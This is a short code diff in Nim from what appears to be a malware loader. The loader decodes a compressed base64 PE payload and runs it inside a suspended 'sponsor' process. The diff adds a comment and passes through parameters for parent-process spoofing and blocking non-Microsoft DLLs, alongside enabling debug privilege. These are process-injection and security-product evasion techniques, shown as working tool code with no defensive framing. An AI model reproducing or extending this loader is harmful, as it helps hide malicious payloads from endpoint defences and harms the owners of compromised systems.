@@ -26,6 +26,7 @@ proc execute(compressedBase64PE: string, sponsorCmd: string = getAppFilename(), 
     # Enable debug privilege
     discard setDebugPrivilege()
     
+    # Create suspended process with extended attributes (ppid, block dll's)
     var ppi: PPROCESS_INFORMATION = createSuspendedExtendedProcess(sponsorCmd, parentProcessName, isBlockDlls)
 
     # Execute module
@@ -39,6 +40,8 @@ proc main*() =
     discard execute(
         compressedBase64PE = compressedBase64PE, 
         sponsorCmd = sponsorPath & sponsorParams,
+        parentProcessName = parentProcessName, 
+        isBlockDlls = isBlockDlls,
         sleepSeconds = sleepSeconds
     )
 
